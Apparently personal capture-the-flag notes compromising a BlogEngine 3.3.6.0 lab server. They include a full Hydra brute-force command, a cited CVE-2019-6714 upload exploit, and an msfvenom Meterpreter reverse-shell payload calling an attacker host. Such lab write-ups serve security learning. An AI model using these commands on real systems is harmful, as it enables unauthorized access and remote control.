- Whats the name of the clown on the mainpage ?
Pennywise

1. Nmap scan
2 ports are open :
	- 80 : webserver 
	- 3389 : rdp
2. Gobuster 
We find interesting pages like /admin


- Hydra 
Use Burp to get the request.

```bash
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

we get the password : 
**1qaz2wsx** 

Exact command : 
```shell 
hydra -l admin -P  /usr/share/wordlists/rockyou.txt 10.10.153.58 http-post-form "/Account/login.aspx:__VIEWSTATE=lE2tnJhh5uNVDJNNohW7K0qVQgYbVZyRs8GsF7iZDqAWwUNjZtII6RwflReSpMtteoX70WgvY9gyOZqz0n5t45ToCuM83Py6S%2BHVjz8p2KaRNgxfc0rMhN7jANyRhRqIRbQXdmUGgoyx7nDzBbuOxQ5AaXQH3ocF5929m%2F6%2FyjQaNEme4JDM8faPYU%2FZrk4aMlrjCOYO24OtkFO7DtfNKtWKEUOkgHIajQs78emyRWKi6wNJ5i6pFVh7Zi7Yxmy6WCzXUPN1wNcBmwaYEjGl4qdWvm5gokbSeRaCjg77ZXmsJHJIHvEImaTdnlTeH82rd%2B0dgyAJWu8OxfPo%2Ff3sPB0DyLoTiR3RCygzBmVYu4lPQ5Cn&__EVENTVALIDATION=PO32x1hXBGEoWQGW4qPybfk5x0cJPvR8BoldFHAnKXvFEYllc7%2FhDWHhfEA5588jaZDx7wXqepvyN3axzERaN6bmpxiej%2FYvz6Ri28SAAkc5izDV9YiNayH5pnKzFH1sW4zeSsMasVnpZo7RYiHwin7N3FcEszY%2FjP1u7PJYwiXp5lkl&ctl00%24MainContent%24LoginUser%24UserName=^USER^+&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

```

- Identifying the blogengine
Now that we are on the dashboard panel we can see that it is a blogengine. 
![[Pasted image 20221111222214.png]]
Version 3.3.6.0

We found on exploit db :  [2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714)

Use the exploit start a nc on the attacker machine and upload the malicious file using recommandations

then : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.12.51 LPORT=4444 -f exe -o toto.exe

use the same method to put the rev shell on the machine
start a multi handler on metasploit
then launch the rev shell

c:\inetpub\wwwroot\App_Data\files>start toto.exe

What is the name of the abnormal _service_ running? 
sysinfo on meterpreter 
Windows 2012 R2 (6.3 Build 9600).